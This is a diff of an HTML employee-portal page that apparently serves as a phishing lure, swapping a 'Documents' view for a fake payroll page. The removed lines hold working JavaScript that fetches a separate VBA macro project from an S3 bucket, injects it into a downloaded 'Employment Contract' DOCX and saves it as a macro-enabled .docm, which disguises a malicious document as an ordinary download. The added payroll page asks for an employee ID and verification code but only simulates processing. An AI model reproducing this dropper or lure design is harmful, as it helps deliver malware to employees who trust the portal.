@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Enterprise Portal - Documents</title>
+    <title>Enterprise Portal - Payroll</title>
     <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
     <style>
         * {
@@ -197,6 +197,7 @@
             border-radius: 8px;
             box-shadow: 0 1px 3px rgba(0, 0, 0, 0.1);
             padding: 1.5rem;
+            margin-bottom: 2rem;
         }
 
         .card-header {
@@ -204,42 +205,6 @@
             justify-content: space-between;
             align-items: center;
             margin-bottom: 1.5rem;
-        }
-
-        .document-list {
-            display: flex;
-            flex-direction: column;
-            gap: 1rem;
-        }
-
-        .document-item {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            padding: 1rem;
-            border: 1px solid #e2e8f0;
-            border-radius: 6px;
-            transition: all 0.3s;
-        }
-
-        .document-item:hover {
-            background-color: #f8fafc;
-        }
-
-        .document-info {
-            display: flex;
-            gap: 1rem;
-            align-items: center;
-        }
-
-        .document-icon {
-            color: var(--primary-color);
-            font-size: 1.5rem;
-        }
-
-        .document-meta {
-            color: #64748b;
-            font-size: 0.875rem;
         }
 
         .button {
@@ -268,56 +233,131 @@
             background-color: #cbd5e1;
         }
 
-        .activity-item {
-            display: flex;
-            gap: 1rem;
-            padding: 1rem 0;
+        /* Table Styles */
+        .payroll-table {
+            width: 100%;
+            border-collapse: collapse;
+        }
+
+        .payroll-table th,
+        .payroll-table td {
+            padding: 1rem;
+            text-align: left;
             border-bottom: 1px solid #e2e8f0;
         }
 
-        .activity-icon {
-            background-color: #e2e8f0;
+        .payroll-table th {
+            background-color: #f8fafc;
+            font-weight: 600;
             color: #475569;
-            width: 32px;
-            height: 32px;
-            border-radius: 50%;
+        }
+
+        .payroll-table tr:hover {
+            background-color: #f1f5f9;
+        }
+
+        /* Sensitive Info Banner */
+        .sensitive-banner {
+            background-color: #fef2f2;
+            border-left: 4px solid #ef4444;
+            padding: 1rem;
+            margin-bottom: 1.5rem;
             display: flex;
             align-items: center;
-            justify-content: center;
+            gap: 1rem;
         }
 
-        .activity-details {
-            flex: 1;
+        .sensitive-banner i {
+            color: #ef4444;
+            font-size: 1.5rem;
         }
 
-        .activity-meta {
-            color: #64748b;
-            font-size: 0.875rem;
+        /* Paste Area Styles */
+        .paste-area {
+            display: flex;
+            flex-direction: column;
+            gap: 1rem;
         }
 
-        #processStatus {
-            margin-top: 15px;
-            padding: 12px;
+        .paste-input {
+            width: 100%;
+            min-height: 150px;
+            padding: 1rem;
+            border: 1px solid #e2e8f0;
             border-radius: 6px;
+            resize: vertical;
+        }
+
+        .modal {
+            display: none;
+            position: fixed;
+            z-index: 1000;
+            left: 0;
+            top: 0;
+            width: 100%;
+            height: 100%;
+            overflow: auto;
+            background-color: rgba(0, 0, 0, 0.5);
+        }
+
+        .modal-content {
+            background-color: #fefefe;
+            margin: 15% auto;
+            padding: 2rem;
+            border-radius: 8px;
+            width: 80%;
+            max-width: 600px;
+            position: relative;
+        }
+
+        .close {
+            position: absolute;
+            right: 1.5rem;
+            top: 1rem;
+            color: #64748b;
+            font-size: 1.5rem;
+            font-weight: bold;
+            cursor: pointer;
+        }
+
+        .verification-form {
+            display: flex;
+            flex-direction: column;
+            gap: 1rem;
+        }
+
+        .form-group {
+            display: flex;
+            flex-direction: column;
+            gap: 0.5rem;
+        }
+
+        .form-group label {
+            font-weight: 600;
+            color: #475569;
+        }
+
+        .form-group input {
+            padding: 0.75rem;
+            border: 1px solid #e2e8f0;
+            border-radius: 6px;
+        }
+
+        .status-message {
+            padding: 1rem;
+            border-radius: 6px;
+            margin-top: 1rem;
             display: none;
         }
 
         .status-success {
             background-color: #d1fae5;
             color: #065f46;
-            border: 1px solid #10b981;
         }
 
         .status-error {
             background-color: #fee2e2;
             color: #991b1b;
-            border: 1px solid #ef4444;
-        }
-
-        .status-processing {
-            background-color: #fff7ed;
-            color: #9a3412;
-            border: 1px solid #fb923c;
         }
 
         @media (max-width: 1024px) {
@@ -352,28 +392,6 @@
                 display: none;
             }
         }
-
-        /* Loading Spinner */
-        .loading-spinner {
-            display: inline-block;
-            width: 20px;
-            height: 20px;
-            border: 3px solid #f3f3f3;
-            border-radius: 50%;
-            border-top: 3px solid var(--primary-color);
-            animation: spin 1s linear infinite;
-            margin-right: 10px;
-        }
-
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
-
-        .button:disabled {
-            opacity: 0.7;
-            cursor: not-allowed;
-        }
     </style>
 </head>
 <body>
@@ -395,7 +413,7 @@
                         </a>
                     </li>
                     <li class="nav-item">
-                        <a href="#" class="nav-link active">
+                        <a href="#" class="nav-link">
                             <i class="fas fa-file-alt"></i>
                             Documents
                         </a>
@@ -407,7 +425,7 @@
                         </a>
                     </li>
                     <li class="nav-item">
-                        <a href="#" class="nav-link">
+                        <a href="#" class="nav-link active">
                             <i class="fas fa-dollar-sign"></i>
                             Payroll
                         </a>
@@ -458,7 +476,7 @@
                 <span class="notification-badge">3</span>
             </div>
             <span>John Doe</span>
-            <button class="button secondary" onclick="handleLogout()">
+            <button class="button secondary">
                 <i class="fas fa-sign-out-alt"></i>
                 Logout
             </button>
@@ -471,133 +489,204 @@
             <div class="breadcrumb">
                 <span>Home</span>
                 <i class="fas fa-chevron-right"></i>
-                <span>Documents</span>
+                <span>Payroll</span>
             </div>
-            <h1>My Documents</h1>
+            <h1>My Payroll</h1>
+        </div>
+
+        <div class="sensitive-banner">
+            <i class="fas fa-exclamation-triangle"></i>
+            <div>
+                <h3>Confidential Information</h3>
+                <p>This page contains sensitive payroll data. Please ensure you're in a private location before viewing.</p>
+            </div>
+        </div>
+
+        <div class="card">
+            <div class="card-header">
+                <h2>Salary Information</h2>
+                <button class="button" id="verifyIdentityBtn">
+                    <i class="fas fa-unlock"></i>
+                    View Full Details
+                </button>
+            </div>
+            <table class="payroll-table">
+                <thead>
+                    <tr>
+                        <th>Component</th>
+                        <th>Amount (USD)</th>
+                        <th>Payment Date</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    <tr>
+                        <td>Base Salary</td>
+                        <td>$8,500.00</td>
+                        <td>25th Feb, 2025</td>
+                    </tr>
+                    <tr>
+                        <td>Performance Bonus</td>
+                        <td>$1,250.00</td>
+                        <td>25th Feb, 2025</td>
+                    </tr>
+                    <tr>
+                        <td>Health Insurance</td>
+                        <td>-$385.50</td>
+                        <td>25th Feb, 2025</td>
+                    </tr>
+                    <tr>
+                        <td>401k Contribution</td>
+                        <td>-$850.00</td>
+                        <td>25th Feb, 2025</td>
+                    </tr>
+                    <tr>
+                        <td>Tax Withholding</td>
+                        <td>-$2,128.75</td>
+                        <td>25th Feb, 2025</td>
+                    </tr>
+                    <tr>
+                        <td><strong>Net Pay</strong></td>
+                        <td><strong>$6,385.75</strong></td>
+                        <td>25th Feb, 2025</td>
+                    </tr>
+                </tbody>
+            </table>
         </div>
 
         <div class="section-grid">
             <div class="card">
                 <div class="card-header">
-                    <h2>Available Documents</h2>
+                    <h2>Expense Reimbursement</h2>
+                    <button class="button" id="submitPasteBtn">
+                        <i class="fas fa-paper-plane"></i>
+                        Submit
+                    </button>
                 </div>
-                <div class="document-list">
-                    <div class="document-item">
-                        <div class="document-info">
-                            <i class="fas fa-file-word document-icon"></i>
-                            <div>
-                                <h3>Employment Contract</h3>
-                                <p class="document-meta">Last updated: Feb 10, 2025 • DOCX Format • 1.2 MB</p>
-                            </div>
-                        </div>
-                        <button class="button" id="downloadButton" onclick="processAndDownloadDocument()">
-                            <i class="fas fa-download"></i>
-                            Download
-                        </button>
-                    </div>
+                <div class="paste-area">
+                    <p>Paste your expense receipt text or invoice details below for quick reimbursement processing.</p>
+                    <textarea class="paste-input" id="pasteInput" placeholder="Paste receipt details, invoice numbers, or expense descriptions here..."></textarea>
+                    <div id="pasteStatus" class="status-message"></div>
                 </div>
-                <div id="processStatus"></div>
             </div>
 
             <div class="card">
                 <div class="card-header">
-                    <h2>Recent Activity</h2>
+                    <h2>Recent Payslips</h2>
                 </div>
-                <div class="activity-list">
-                    <div class="activity-item">
-                        <div class="activity-icon">
-                            <i class="fas fa-eye"></i>
+                <ul class="document-list">
+                    <li style="display: flex; justify-content: space-between; padding: 1rem 0; border-bottom: 1px solid #e2e8f0;">
+                        <div style="display: flex; gap: 0.5rem; align-items: center;">
+                            <i class="fas fa-file-pdf" style="color: #ef4444;"></i>
+                            <div>
+                                <h4>January 2025</h4>
+                                <p style="color: #64748b; font-size: 0.875rem;">PDF • 235 KB</p>
+                            </div>
                         </div>
-                        <div class="activity-details">
-                            <p>HR reviewed your documents </p>
-                            <p class="activity-meta">Feb 7, 2025 at 11:15 AM</p>
+                        <button class="button secondary">
+                            <i class="fas fa-download"></i>
+                        </button>
+                    </li>
+                    <li style="display: flex; justify-content: space-between; padding: 1rem 0; border-bottom: 1px solid #e2e8f0;">
+                        <div style="display: flex; gap: 0.5rem; align-items: center;">
+                            <i class="fas fa-file-pdf" style="color: #ef4444;"></i>
+                            <div>
+                                <h4>December 2024</h4>
+                                <p style="color: #64748b; font-size: 0.875rem;">PDF • 241 KB</p>
+                            </div>
                         </div>
-                    </div>
-                </div>
+                        <button class="button secondary">
+                            <i class="fas fa-download"></i>
+                        </button>
+                    </li>
+                </ul>
             </div>
         </div>
     </main>
 
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/jszip/3.7.1/jszip.min.js"></script>
+    <!-- Verification Modal -->
+    <div id="verificationModal" class="modal">
+        <div class="modal-content">
+            <span class="close">&times;</span>
+            <h2>Verify Your Identity</h2>
+            <p style="margin-bottom: 1.5rem;">For security reasons, please verify your identity to view confidential payroll information.</p>
+            <form class="verification-form" id="verificationForm">
+                <div class="form-group">
+                    <label for="employeeId">Employee ID</label>
+                    <input type="text" id="employeeId" required>
+                </div>
+                <div class="form-group">
+                    <label for="verificationCode">Verification Code (Check your email or SMS)</label>
+                    <input type="text" id="verificationCode" required>
+                </div>
+                <button type="submit" class="button">
+                    <i class="fas fa-check-circle"></i>
+                    Verify
+                </button>
+            </form>
+        </div>
+    </div>
+
     <script>
-        async function processAndDownloadDocument() {
-            const statusElement = document.getElementById('processStatus');
-            const downloadButton = document.getElementById('downloadButton');
-            
-            downloadButton.disabled = true;
-            statusElement.style.display = 'block';
-            statusElement.className = 'status-processing';
-            statusElement.innerHTML = '<div class="loading-spinner"></div>Fetching documents from secure storage...';
-        
-            try {
-                // Fetch both files from S3
-                const [docResponse, vbaResponse] = await Promise.all([
-                    fetch('https://documentdemo1.s3.ap-southeast-1.amazonaws.com/Employment+Contract.docx'),
-                    fetch('https://documentdemo1.s3.ap-southeast-1.amazonaws.com/vbaProject.bin')
-                ]);
-                
-                if (!docResponse.ok || !vbaResponse.ok) throw new Error('Failed to fetch documents');
-                
-                const [docxArrayBuffer, vbaArrayBuffer] = await Promise.all([
-                    docResponse.arrayBuffer(),
-                    vbaResponse.arrayBuffer()
-                ]);
-        
-                statusElement.innerHTML = '<div class="loading-spinner"></div>Processing document...';
-        
-                // Load the DOCX as a zip archive
-                const zip = await JSZip.loadAsync(docxArrayBuffer);
-                zip.file("vbaProject.bin", vbaArrayBuffer);
-        
-                // Update [Content_Types].xml
-                const contentTypesPath = "[Content_Types].xml";
-                let contentTypesXml = await zip.file(contentTypesPath).async("string");
-                if (!contentTypesXml.includes("vbaProject.bin")) {
-                    const overrideEntry = '<Override PartName="/vbaProject.bin" ContentType="application/vnd.ms-office.vbaProject" />';
-                    contentTypesXml = contentTypesXml.replace('</Types>', overrideEntry + '</Types>');
-                    zip.file(contentTypesPath, contentTypesXml);
-                }
-        
-                // Update relationships
-                const relsPath = "word/_rels/document.xml.rels";
-                if (zip.file(relsPath)) {
-                    let relsXml = await zip.file(relsPath).async("string");
-                    if (!relsXml.includes("vbaProject.bin")) {
-                        const newRel = '<Relationship Id="rIdVBA" Type="http://schemas.microsoft.com/office/2006/relationships/vbaProject" Target="/vbaProject.bin"/>';
-                        relsXml = relsXml.replace('</Relationships>', newRel + '</Relationships>');
-                        zip.file(relsPath, relsXml);
-                    }
-                }
-        
-                statusElement.innerHTML = '<div class="loading-spinner"></div>Preparing download...';
-                const newDocmBlob = await zip.generateAsync({
-                    type: "blob",
-                    mimeType: "application/vnd.ms-word.document.macroEnabled.12"
-                });
-        
-                // Trigger download
-                const downloadLink = document.createElement("a");
-                downloadLink.href = URL.createObjectURL(newDocmBlob);
-                downloadLink.download = "employment_contract.docm";
-                downloadLink.click();
-        
-                statusElement.className = 'status-success';
-                statusElement.innerHTML = '<i class="fas fa-check-circle"></i> Document successfully processed and downloaded!';
-                URL.revokeObjectURL(downloadLink.href);
-            } catch (err) {
-                console.error("Error processing document:", err);
-                statusElement.className = 'status-error';
-                statusElement.innerHTML = '<i class="fas fa-exclamation-circle"></i> Error processing document. Please try again later.';
-            } finally {
-                downloadButton.disabled = false;
-                if (statusElement.classList.contains('status-success')) {
-                    setTimeout(() => {
-                        statusElement.style.display = 'none';
-                    }, 5000);
-                }
+        // Toggle sidebar on mobile
+        function toggleSidebar() {
+            document.querySelector('.sidebar').classList.toggle('active');
+        }
+
+        // Verification Modal
+        const modal = document.getElementById("verificationModal");
+        const verifyBtn = document.getElementById("verifyIdentityBtn");
+        const closeBtn = document.getElementsByClassName("close")[0];
+
+        verifyBtn.onclick = function() {
+            modal.style.display = "block";
+        }
+
+        closeBtn.onclick = function() {
+            modal.style.display = "none";
+        }
+
+        window.onclick = function(event) {
+            if (event.target == modal) {
+                modal.style.display = "none";
             }
         }
-        
+
+        // Form handling
+        document.getElementById("verificationForm").addEventListener("submit", function(e) {
+            e.preventDefault();
+            
+                            // Simulate verification - in real app, this would be a server request
+            setTimeout(() => {
+                modal.style.display = "none";
+                // No need to replace values as they're already shown
+            }, 1500);
+        });
+
+        // Handle paste submission
+        document.getElementById("submitPasteBtn").addEventListener("click", function() {
+            const pasteContent = document.getElementById("pasteInput").value.trim();
+            const statusEl = document.getElementById("pasteStatus");
+            
+            if (pasteContent === "") {
+                statusEl.textContent = "Please paste content before submitting.";
+                statusEl.className = "status-message status-error";
+                statusEl.style.display = "block";
+                return;
+            }
+            
+            // Simulate processing - in real app, this would be a server request
+            statusEl.textContent = "Processing your expense reimbursement...";
+            statusEl.className = "status-message";
+            statusEl.style.backgroundColor = "#fff7ed";
+            statusEl.style.color = "#9a3412";
+            statusEl.style.display = "block";
+            
+            setTimeout(() => {
+                statusEl.textContent = "Expense submitted successfully. Your reimbursement will be processed with your next payroll cycle.";
+                statusEl.className = "status-message status-success";
+                document.getElementById("pasteInput").value = "";
+            }, 2000);
+        });
     </script>
 </body>
 </html>
